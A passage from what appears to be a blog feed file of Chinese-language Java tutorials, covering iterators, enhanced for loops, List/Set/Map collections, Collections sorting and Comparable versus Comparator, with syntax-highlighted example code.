punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"DDD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> it <span class="token operator">=</span> coll<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>it<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">String</span> e <span class="token operator">=</span> it<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"=============="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// String e = it.next();// 没有元素，在取出元素会抛出NoSuchElementException</span>        <span class="token comment">// System.out.println(e);</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="增强-for"><a href="#增强-for" class="headerlink" title="增强 for"></a>增强 for</h2><p>增强 for 循环(也称 for each 循环)是 JDK1.5 以后出来的一个高级 for 循环，专门用来遍历数组和集合的。它<br>的内部原理其实是个 Iterator 迭代器，所以在遍历的过程中，不能对集合中的元素进行增删操作。</p><h3 id="格式："><a href="#格式：" class="headerlink" title="格式："></a>格式：</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">for</span><span class="token punctuation">(</span>元素的数据类型  变量 <span class="token operator">:</span> <span class="token class-name">Collection</span>集合or数组<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">//写操作代码</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ForeachTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"AAA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"BBB"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"CCC"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"DDD"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> s <span class="token operator">:</span> list<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arr <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">:</span> arr<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>增强 for 必须有被遍历的目标，目标只能是 Collection 或者是数组</p><p>一般仅仅作为遍历操作出现</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>集合</title>
      <link href="/2021/10/11/%E9%9B%86%E5%90%88/"/>
      <url>/2021/10/11/%E9%9B%86%E5%90%88/</url>
      
        <content type="html"><![CDATA[<h1 id="集合概述"><a href="#集合概述" class="headerlink" title="集合概述"></a>集合概述</h1><p>集合是 java 中提供的一种容器，可以用来存储多个数据</p><blockquote><ul><li><p>数组的长度是固定的，集合的长度是可变的</p></li><li><p>数组中存储的是同一类型的元素，可以存储基本数据类型值。集合存储的都是对象。而且对象的类型可以不一致。在开发中一般当对象多的时候，使用集合进行存储。</p></li></ul></blockquote><h1 id="集合框架"><a href="#集合框架" class="headerlink" title="集合框架"></a>集合框架</h1><p>集合按照其存储结构可以分为两大类，分别是单列集合<code>java.util.Collection</code>和双列集合<code>java.util.Map</code></p><ul><li><strong>Collection</strong>：单列集合类的根接口，用于存储一系列符合某种规则的元素，它有两个重要的子接口，分别是<code>java.util.List</code>和<code>java.util.Set</code>。其中，<code>List</code>的特点是元素有序、元素可重复。<code>Set</code>的特点是元素无序，而且不可重复。<code>List</code>接口的主要实现类有<code>java.util.ArrayList</code>和<code>java.util.LinkedList</code>，Set 接口的主要实现类有<code>java.util.HashSet</code>和<code>java.util.TreeSet</code>。</li><li><strong>Map</strong>：</li></ul><h2 id="Collection-集合"><a href="#Collection-集合" class="headerlink" title="Collection 集合"></a>Collection 集合</h2><p><code>java.util.Collection</code>接口</p><p><em>所有单列集合（List、Set）的最顶层的接口，里面定义了所有单列集合共性的方法，任意的单列集合都可以使用 Collection 接口中的方法</em></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">E</span> e<span class="token punctuation">)</span> <span class="token comment">//把给定的对象添加到当前集合中 。</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">// 清空集合中所有的元素。</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">remove</span><span class="token punctuation">(</span><span class="token class-name">E</span> e<span class="token punctuation">)</span> <span class="token comment">// 把给定的对象在当前集合中删除。</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">contains</span><span class="token punctuation">(</span><span class="token class-name">E</span> e<span class="token punctuation">)</span> <span class="token comment">// 判断当前集合中是否包含给定的对象。</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 判断当前集合是否为空。</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 返回集合中元素的个数。</span><span class="token keyword">public</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">toArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 把集合中的元素，存储到数组中。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="List-接口"><a href="#List-接口" class="headerlink" title="List 接口"></a>List 接口</h3><p><code>java.util.List</code> 接口继承自 <code>Collection</code> 接口，是单列集合的一个重要分支，习惯性地会将实现了 List 接口的对<br>象称为 List 集合。在 List 集合中允许出现重复的元素，所有的元素是以一种线性方式进行存储的，在程序中可以通过<br>索引来访问集合中的指定元素。另外，List 集合还有一个特点就是元素有序，即元素的存入顺序和取出顺序一致。</p><ul><li>特点</li></ul><ol><li>有序的集合，存储元素和取出元素的顺序是一致的</li><li>有索引，包含了一些带索引的方法</li><li>集合中可以有重复的元素，通过元素的<code>equals()</code>方法，来比较是否为重复的元素</li></ol><ul><li>常用方法</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span><span class="token class-name">E</span> element<span class="token punctuation">)</span> <span class="token comment">//将指定的元素，添加到该集合中的指定位置</span><span class="token keyword">public</span> <span class="token class-name">E</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token comment">//返回集合中指定位置的元素</span><span class="token keyword">public</span> <span class="token class-name">E</span> <span class="token function">remove</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token comment">//移除列表中指定位置的元素，返回被移除的元素</span><span class="token keyword">public</span> <span class="token class-name">E</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">,</span><span class="token class-name">E</span> element<span class="token punctuation">)</span> <span class="token comment">//用指定元素替换集合中指定位置的元素，返回更新前的元素</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//返回此集合中的元素数。遍历集合时，可以控制索引范围，防止越界</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ArrayList-集合"><a href="#ArrayList-集合" class="headerlink" title="ArrayList 集合"></a>ArrayList 集合</h4><p><code>java.util.ArrayList</code> 集合数据存储的结构是数组结构。元素增删慢，查找快，由于日常开发中使用最多的功能为<br>查询数据、遍历数据，所以 ArrayList 是最常用的集合。<br>许多程序员开发时非常随意地使用 ArrayList 完成任何需求，并不严谨，这种用法是不提倡的</p><ul><li>常用方法</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token class-name">E</span> e<span class="token punctuation">)</span> <span class="token comment">//将指定的元素添加到此集合的尾部。</span><span class="token keyword">public</span> <span class="token class-name">E</span> <span class="token function">remove</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token comment">//移除此集合中指定位置上的元素。返回被删除的元素。</span><span class="token keyword">public</span> <span class="token class-name">E</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token keyword">int</span> index<span class="token punctuation">)</span> <span class="token comment">//返回此集合中指定位置上的元素。返回获取的元素。</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//返回此集合中的元素数。遍历集合时，可以控制索引范围，防止越界</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="LinkedList-集合"><a href="#LinkedList-集合" class="headerlink" title="LinkedList 集合"></a>LinkedList 集合</h4><p><code>java.util.LinkedList</code> 集合数据存储的结构是链表结构。方便元素添加、删除的集合。</p><blockquote><p>LinkedList 是一个双向链表</p></blockquote><ul><li>常用方法</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addFirst</span><span class="token punctuation">(</span><span class="token class-name">E</span> e<span class="token punctuation">)</span> <span class="token comment">//将指定元素插入此列表的开头。</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">addLast</span><span class="token punctuation">(</span><span class="token class-name">E</span> e<span class="token punctuation">)</span> <span class="token comment">//将指定元素添加到此列表的结尾。</span><span class="token keyword">public</span> <span class="token class-name">E</span> <span class="token function">getFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//返回此列表的第一个元素。</span><span class="token keyword">public</span> <span class="token class-name">E</span> <span class="token function">getLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//返回此列表的最后一个元素。</span><span class="token keyword">public</span> <span class="token class-name">E</span> <span class="token function">removeFirst</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//移除并返回此列表的第一个元素。</span><span class="token keyword">public</span> <span class="token class-name">E</span> <span class="token function">removeLast</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//移除并返回此列表的最后一个元素。</span><span class="token keyword">public</span> <span class="token class-name">E</span> <span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//从此列表所表示的堆栈处弹出一个元素。</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">E</span> e<span class="token punctuation">)</span> <span class="token comment">//将元素推入此列表所表示的堆栈。</span><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//如果列表不包含元素，则返回true。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Set-接口"><a href="#Set-接口" class="headerlink" title="Set 接口"></a>Set 接口</h3><p><code>java.util.Set</code> 接口和 <code>java.util.List</code> 接口一样，同样继承自 <code>Collection</code> 接口，它与 <code>Collection</code> 接口中的方<br>法基本一致，并没有对 <code>Collection</code> 接口进行功能上的扩充，只是比 <code>Collection</code> 接口更加严格了。与 <code>List</code> 接口不<br>同的是， <code>Set</code> 接口中元素无序，并且都会以某种规则保证存入的元素不出现重复。</p><blockquote><p>tips:Set 集合取出元素的方式可以采用：迭代器、增强 for</p></blockquote><ul><li>特点<ol><li>不允许存储重复的元素</li><li>没有索引，没有带索引的方法，不能使用普通的 for 循环遍历</li></ol></li></ul><h4 id="HashSet-集合"><a href="#HashSet-集合" class="headerlink" title="HashSet 集合"></a>HashSet 集合</h4><p><code>java.util.HashSet</code> 是 <code>Set</code> 接口的一个实现类，它所存储的元素是不可重复的，并且元素都是无序的(即存取顺序<br>不一致)。 <code>java.util.HashSet</code> 底层的实现其实是一个 <code>java.util.HashMap</code> 支持.</p><ul><li>特点<ol><li>不允许存储重复的元素</li><li>没有索引，没有带索引的方法</li><li>是一个无序的集合，存储元素和取出元素的顺序有可能不一致</li><li>底层是一个哈希表结构（查询速度非常快）</li></ol></li></ul><h4 id="LinkedHashSet-集合"><a href="#LinkedHashSet-集合" class="headerlink" title="LinkedHashSet 集合"></a>LinkedHashSet 集合</h4><p>在 HashSet 下面有一个子类 <code>java.util.LinkedHashSet</code> ，它是链表和哈希表组合的一个数据存储结构。</p><ul><li><p>特点</p><p>底层是一个哈希表(数组+链表&#x2F;红黑树)+链表:多了一条链表(记录元素的存储顺序),保证元素有序</p></li></ul><h3 id="Collections-类"><a href="#Collections-类" class="headerlink" title="Collections 类"></a>Collections 类</h3><p><code>java.utils.Collections</code> 是集合工具类，用来对集合进行操作。</p><ul><li>常用方法</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token keyword">boolean</span> <span class="token function">addAll</span><span class="token punctuation">(</span><span class="token class-name">Collection</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> c<span class="token punctuation">,</span> <span class="token class-name">T</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> elements<span class="token punctuation">)</span> <span class="token comment">//往集合中添加一些元素。</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">shuffle</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> list<span class="token punctuation">)</span> <span class="token comment">//打乱集合顺序。</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> list<span class="token punctuation">)</span> <span class="token comment">//将集合中元素按照默认规则排序。</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token keyword">void</span> <span class="token function">sort</span><span class="token punctuation">(</span><span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">></span></span> list，<span class="token class-name">Comparator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span> <span class="token keyword">super</span> <span class="token class-name">T</span><span class="token punctuation">></span></span> <span class="token punctuation">)</span> <span class="token comment">//将集合中元素按照指定规则排序。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="Comparable-接口"><a href="#Comparable-接口" class="headerlink" title="Comparable 接口"></a>Comparable 接口</h4><p><code>public static &lt;T&gt; void sort(List&lt;T&gt; list)</code> :将集合中元素按照默认规则排序。</p><ul><li><p>使用前提</p><p>被排序的集合里面存储的元素，必须实现<code>Comparable</code>接口，重写<code>comparaTo()</code>定义排序的规则</p></li><li><p>排序规则</p><p>this-参数 ：升序</p></li></ul><blockquote><p>两个对象比较的结果有三种：大于，等于，小于。<br>如果要按照升序排序， 则 o1 小于 o2，返回（负数），相等返回 0，o1 大于 o2 返回（正数）</p><p>如果要按照降序排序 ，则 o1 小于 o2，返回（正数），相等返回 0，01 大于 02 返回（负数）</p></blockquote><h4 id="Comparator-接口"><a href="#Comparator-接口" class="headerlink" title="Comparator 接口"></a>Comparator 接口</h4><p><code>public static &lt;T&gt; void sort(List&lt;T&gt; list，Comparator&lt;? super T&gt; )</code>：将集合中元素按照指定规则排序</p><p><code>Comparator</code>这个接口，位于位于<code>java.util</code>包下，排序是<code>comparator</code>能实现的功能之一,该接口代表一个比较器</p><ul><li>排序规则</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token class-name">String</span> o1<span class="token punctuation">,</span> <span class="token class-name">String</span> o2<span class="token punctuation">)</span> <span class="token comment">//比较其两个参数的顺序。</span>     <span class="token comment">// o1 - o2 ：升序</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="Comparable-和-Comparator-两个接口的区别"><a href="#Comparable-和-Comparator-两个接口的区别" class="headerlink" title="Comparable 和 Comparator 两个接口的区别"></a>Comparable 和 Comparator 两个接口的区别</h4><p><code>Comparable</code>：强行对实现它的每个类的对象进行整体排序。这种排序被称为类的自然排序，类的<code>compareTo()</code>方法<br>被称为它的自然比较方法。只能在类中实现<code>compareTo()</code>一次，不能经常修改类的代码实现自己想要的排序。实现<br>此接口的对象列表（和数组）可以通过<code>Collections.sort</code>（和<code>Arrays.sort</code>）进行自动排序，对象可以用作有序映射中<br>的键或有序集合中的元素，无需指定比较器。<br><code>Comparator</code>强行对某个对象进行整体排序。可以将<code>Comparator</code> 传递给<code>sort</code>方法（如<code>Collections.sort</code>或<br><code>Arrays.sort</code>），从而允许在排序顺序上实现精确控制。还可以使用<code>Comparator</code>来控制某些数据结构（如有序<code>set</code>或<br>有序映射）的顺序，或者为那些没有自然顺序的对象<code>collection</code>提供排序。</p><h2 id="Map-集合"><a href="#Map-集合" class="headerlink" title="Map 集合"></a>Map 集合</h2><ul><li><p>特点</p><ol><li>Map 集合是一个双列集合，一格元素包含两个值（key,value）</li><li>Map 集合中的元素，key 和 value 的数据类型可以相同，也可以不同</li><li>Map 集合中的元素，key 是不允许重复的，value 是可以重复的</li><li>Map 集合中的元素，key 和 value 是一一对应的</li></ol></li><li><p>常用方法</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">V</span> <span class="token function">put</span><span class="token punctuation">(</span><span class="token class-name">K</span> key<span class="token punctuation">,</span> <span class="token class-name">V</span> value<span class="token punctuation">)</span> <span class="token comment">// 把指定的键与指定的值添加到Map集合中。</span><span class="token keyword">public</span> <span class="token class-name">V</span> <span class="token function">remove</span><span class="token punctuation">(</span><span class="token class-name">Object</span> key<span class="token punctuation">)</span> <span class="token comment">// 把指定的键 所对应的键值对元素 在Map集合中删除，返回被删除元素的值。</span><span class="token keyword">public</span> <span class="token class-name">V</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token class-name">Object</span> key<span class="token punctuation">)</span> <span class="token comment">// 根据指定的键，在Map集合中获取对应的值。</span><span class="token keyword">public</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">></span></span> <span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 获取Map集合中所有的键，存储到Set集合中。</span><span class="token keyword">public</span> <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token punctuation">&lt;</span><span class="token class-name">K</span><span class="token punctuation">,</span><span class="token class-name">V</span><span class="token punctuation">></span><span class="token punctuation">></span></span> <span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 获取到Map集合中所有的键值对对象的集合(Set集合)。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>遍历 Map 的方法</p><ol><li><p>键找值方式：即通过元素中的键，获取键所对应的值</p><ul><li><p>步骤：</p><ol><li>获取 Map 中所有的键，由于键是唯一的，所以返回一个 Set 集合存储所有的键。 <code>keyset()</code></li><li>遍历键的 Set 集合，得到每一个键。</li><li>根据键，获取键所对应的值。<code>get(K key)</code></li></ol></li><li><p>演示：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"张三"</span><span class="token punctuation">,</span> <span class="token number">168</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"李四"</span><span class="token punctuation">,</span> <span class="token number">165</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"王五"</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> keySet <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> string <span class="token operator">:</span> keySet<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">Integer</span> value <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>键值对方式：即通过集合中每个键值对(Entry)对象，获取键值对(Entry)对象中的键与值。</p><ul><li><p>步骤</p><ol><li>使用<code>Map</code>集合中的方法<code>entrySet()</code>，把 Map 集合中多个<code>Entry</code>对象取出来，存储到一个<code>Set</code>集合中</li><li>遍历<code>Set</code>集合，获取每一个 Entry 对象</li><li>使用<code>Entry</code>对象中的方法<code>getKey()</code>和<code>getValue()</code>获取键与值</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span></span> map <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"张三"</span><span class="token punctuation">,</span> <span class="token number">168</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"李四"</span><span class="token punctuation">,</span> <span class="token number">165</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        map<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span><span class="token string">"王五"</span><span class="token punctuation">,</span> <span class="token number">178</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Set</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">></span><span class="token punctuation">></span></span> set <span class="token operator">=</span> map<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">Map<span class="token punctuation">.</span>Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span><span class="token class-name">Integer</span><span class="token punctuation">></span></span> entry <span class="token operator">:</span> set<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>entry<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> entry<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li></ol></li></ul><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p><code>java.util.HashMap&lt;K,V&gt; implements 